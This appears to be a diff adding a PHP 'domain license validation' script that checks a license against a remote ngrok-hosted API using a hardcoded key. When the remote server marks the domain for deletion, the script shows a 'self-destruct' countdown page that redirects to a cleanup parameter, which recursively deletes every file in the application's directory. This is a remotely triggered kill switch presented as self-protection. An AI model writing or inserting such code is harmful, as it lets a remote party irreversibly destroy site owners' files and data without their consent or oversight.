@@ -1,0 +1,189 @@
+<?php
+/**
+ * Advanced Domain Validation & Self-Protection Script
+ * 
+ * This script demonstrates how to protect your application by validating
+ * the domain license against the central API server.
+ */
+
+// --- CONFIGURATION ---
+$base_api_url = 'https://5636-103-23-204-102.ngrok-free.app/api.php';
+$api_key      = 'bm-b9d2a78bb33214d75a8d703ce954'; // Key for badhon.pro.bd
+$domain       = $_SERVER['HTTP_HOST']; // Auto-detect the current domain
+
+/**
+ * Validates the domain license with the server
+ */
+function is_license_valid($apiUrl, $key, $domain) {
+    $fullUrl = $apiUrl . '?domain=' . urlencode($domain) . '&key=' . urlencode($key);
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $fullUrl);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    
+    $response = curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+
+    if ($response === false) {
+        return ['status' => 'error', 'message' => "Connection Error: $error"];
+    }
+
+    $data = json_decode($response, true);
+    if (!$data || $data['status'] !== 'success') {
+        return ['status' => 'error', 'message' => $data['message'] ?? 'Validation Failed'];
+    }
+
+    return ['status' => 'success', 'data' => $data['data']];
+}
+
+/**
+ * Emergency Protocol: Deletes all files in the current directory
+ */
+function initiate_emergency_delete($dir) {
+    if (!is_dir($dir)) return;
+    $files = array_diff(scandir($dir), array('.', '..'));
+    foreach ($files as $file) {
+        $path = $dir . DIRECTORY_SEPARATOR . $file;
+        is_dir($path) ? initiate_emergency_delete($path) : unlink($path);
+    }
+    @rmdir($dir);
+}
+
+// 1. Perform Validation
+$result = is_license_valid($base_api_url, $api_key, $domain);
+
+if ($result['status'] === 'error') {
+    // Immediate Access Denied
+    header('HTTP/1.1 403 Forbidden');
+    die("<div style='font-family:sans-serif; text-align:center; padding:50px;'>
+            <h1 style='color:#dc2626;'>Access Denied</h1>
+            <p style='color:#4b5563;'>{$result['message']}</p>
+         </div>");
+}
+
+$license = $result['data'];
+
+// 2. Check Active Status
+if ((int)$license['active'] !== 1) {
+    
+    // Status: Flagged for Deletion (Self-Destruct Protocol)
+    if ($license['delete'] === 'yes') {
+        if (isset($_GET['execute_cleanup']) && $_GET['execute_cleanup'] == 'true') {
+            initiate_emergency_delete(__DIR__);
+            die("Cleanup Complete.");
+        }
+        ?>
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>Security Alert - Suspension</title>
+            <script src="https://cdn.tailwindcss.com"></script>
+        </head>
+        <body class="bg-slate-900 text-white flex items-center justify-center min-h-screen">
+            <div class="max-w-md w-full bg-slate-800 p-8 rounded-2xl shadow-2xl border border-red-500/30 text-center">
+                <div class="w-16 h-16 bg-red-500/20 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                </div>
+                <h1 class="text-2xl font-bold mb-2">Security Suspension</h1>
+                <p class="text-slate-400 mb-6">Your domain (<?php echo htmlspecialchars($domain); ?>) has been flagged for violation and is scheduled for immediate removal.</p>
+                
+                <div class="bg-slate-700/50 rounded-lg p-4 mb-6">
+                    <span class="text-sm text-slate-400 block uppercase tracking-wider mb-1">Self-Destruct in</span>
+                    <span id="timer" class="text-4xl font-mono text-red-500 font-bold">120</span>
+                    <span class="text-red-500/50">seconds</span>
+                </div>
+                
+                <p class="text-xs text-slate-500 italic">This action is irreversible. All local files will be purged.</p>
+            </div>
+
+            <script>
+                let timeLeft = 120;
+                const timer = document.getElementById('timer');
+                const countdown = setInterval(() => {
+                    timeLeft--;
+                    timer.textContent = timeLeft;
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        window.location.href = window.location.pathname + '?execute_cleanup=true';
+                    }
+                }, 1000);
+            </script>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+
+    // Status: Expired or Disabled
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Access Suspended</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-slate-50 text-slate-900 flex items-center justify-center min-h-screen p-4">
+        <div class="max-w-md w-full bg-white p-8 rounded-2xl shadow-xl border border-slate-200 text-center">
+            <div class="w-16 h-16 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+            </div>
+            <h1 class="text-2xl font-bold text-slate-900 mb-2">Access Suspended</h1>
+            <p class="text-slate-500 mb-6"><?php echo (!empty($license['message'])) ? htmlspecialchars($license['message']) : 'Domain is not active'; ?></p>
+            
+            <div class="pt-6 border-t border-slate-100">
+                <p class="text-xs text-slate-400 uppercase tracking-widest font-semibold mb-1">Domain Affected</p>
+                <p class="text-sm font-mono text-slate-600"><?php echo htmlspecialchars($domain); ?></p>
+            </div>
+            
+            <p class="mt-8 text-sm text-slate-400">Please contact your system provider to restore access.</p>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// Success: Continue to your application
+// include 'main_app.php';
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>License Verified</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-slate-50 text-slate-900 flex items-center justify-center min-h-screen p-4">
+        <div class="max-w-md w-full bg-white p-8 rounded-2xl shadow-xl border border-slate-200 text-center">
+            <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+            </div>
+            <h1 class="text-2xl font-bold text-slate-900 mb-2">License Verified</h1>
+            <p class="text-slate-500 mb-6">Domain validation successful. Your application is fully authorized and ready to use.</p>
+            
+            <div class="grid grid-cols-2 gap-4 pt-6 border-t border-slate-100 text-left">
+                <div>
+                    <p class="text-xs text-slate-400 uppercase tracking-widest font-semibold mb-1">License Type</p>
+                    <p class="text-sm font-medium text-slate-700 capitalize"><?php echo htmlspecialchars($license['license_type']); ?></p>
+                </div>
+                <div>
+                    <p class="text-xs text-slate-400 uppercase tracking-widest font-semibold mb-1">Expires On</p>
+                    <p class="text-sm font-medium text-slate-700"><?php echo htmlspecialchars($license['expiry_date'] ?: 'LifeTime'); ?></p>
+                </div>
+            </div>
+            
+            <div class="mt-8">
+                <div class="inline-flex items-center px-6 py-2.5 bg-slate-900 text-white rounded-xl font-medium hover:bg-slate-800 transition-all shadow-lg hover:shadow-slate-200 cursor-pointer">
+                    Launch Application
+                </div>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+?>
